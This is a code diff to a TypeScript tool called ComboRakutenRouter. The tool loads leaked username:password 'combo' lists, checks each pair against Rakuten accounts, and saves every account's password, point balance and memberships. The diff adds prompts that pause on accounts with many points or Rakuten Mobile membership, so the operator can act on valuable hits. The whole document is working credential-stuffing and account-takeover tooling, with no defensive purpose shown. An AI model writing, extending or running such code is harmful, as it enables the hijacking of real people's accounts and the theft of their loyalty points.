@@ -103,6 +103,71 @@ export class ComboRakutenRouter {
       return;
     }
 
+    const filter = {
+      point: {
+        use: false,
+        value: 0
+      },
+      rakutenMobile: {
+        use: false,
+        value: true
+      },
+      use: false
+    }
+
+    this.loggerMessages.blank();
+
+    const useFilter = (await new inputManager(
+      "Filterを使用し、ヒットしたら止めるようにしますか？ (y/N): ",
+    ).waitInput()).toUpperCase();
+
+    if (useFilter === "Y") {
+      filter.use = true;
+    }else {
+      filter.use = false;
+      this.logger.info({}, "Filterは使用されません");
+    }
+
+    if (filter.use) {
+      this.loggerMessages.blank();
+      this.loggerMessages.blank();
+
+      const usePoint = (await new inputManager(
+        "PointのFilterを使用し、ヒットしたら止めるようにしますか？ (y/N): ",
+      ).waitInput()).toUpperCase();
+
+      if (usePoint === "Y") {
+        filter.point.use = true;
+        const _value = parseInt(await new inputManager(
+          "PointのFilter値を入力してください (X以上) : ",
+        ).waitInput());
+
+        if (!isNaN(_value)) {
+          filter.point.value = _value;
+        }else {
+          this.logger.info({}, "入力値が不正なため、" + filter.point.value + "以上に設定されました。");
+        }
+      }else {
+        filter.point.use = false;
+        this.logger.info({}, "PointのFilterは使用されません");
+      }
+
+      this.loggerMessages.blank();
+
+      const useRakutenMobile = (await new inputManager(
+        "Rakuten MobileのFilterを使用し、ヒットしたら止めるようにしますか？ (y/N): ",
+      ).waitInput()).toUpperCase();
+
+      if (useRakutenMobile === "Y") {
+        filter.rakutenMobile.use = true;
+      }else {
+        filter.rakutenMobile.use = false;
+        this.logger.info({}, "Rakuten MobileのFilterは使用されません");
+      }
+
+      this.loggerMessages.blank();
+    }
+    
     if (/^\S+$/.test(comboFilePath) && fs.existsSync(comboFilePath)) {
       const content = fs
         .readFileSync(comboFilePath, { encoding: "utf-8" })
@@ -129,7 +194,7 @@ export class ComboRakutenRouter {
           .split(":");
         const url = splitLine[0];
         if (!url.includes("rakuten") || splitLine.length < 3) {
-          this.logger.warn({}, "形式が違うComboがスキップされました。");
+          this.logger.warn({}, `(${i + 1}/${len}) ${splitLine.join(":")} 形式が違うComboがスキップされました。`);
           continue;
         }
 
@@ -142,8 +207,6 @@ export class ComboRakutenRouter {
           password,
         });
       }
-
-      console.log(alreadyChecked)
 
       for (let i = 0, len = comboResult.length; i < len; i++) {
         if (alreadyChecked.includes(comboResult[i].username)) {
@@ -190,13 +253,36 @@ export class ComboRakutenRouter {
           `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} の解析完了`,
         );
 
+        const info = `${comboResult[i].username ?? "unknown"}:${comboResult[i].password ?? "unknown"}:${JSON.parse(result.message).point}:${JSON.parse(
+          result.message,
+        )
+          .some.map((some) => `${some.value}`)
+          .join(":")}`.replace(/\n/gm, "")
+
+        if (filter.use) {
+          const point = JSON.parse(result.message).point;
+          const rakutenMobile = JSON.parse(result.message).some.find(file => file.name === "Rakuten Mobile").value === 'Mobile会員' ?? false;
+
+          if ((filter.point.use && parseInt(point) > filter.point.value) || (filter.rakutenMobile.use && rakutenMobile === filter.rakutenMobile.value)) {
+            this.logger.info(
+              {},
+              `(${i + 1}/${len}) ${comboResult[i].username}:${comboResult[i].password} がフィルターによりヒットしました。`,
+            );
+
+            this.logger.info(
+              {},
+              `情報: ${info}`,
+            )
+
+            await (
+              new inputManager(`${this.enogu.green("[Wait] 完了したら Enter を押してください。: ")} `).waitInput()
+            )
+          }
+        }
+
         fs.appendFileSync(
           resultFilePath,
-          `${comboResult[i].username ?? "unknown"}:${comboResult[i].password ?? "unknown"}:${JSON.parse(result.message).point}:${JSON.parse(
-            result.message,
-          )
-            .some.map((some) => `${some.value}`)
-            .join(":")}`.replace(/\n/gm, "") + "\n",
+          `${info}\n`,
         );
 
         await wait(this.config.values.waitTime / 3);
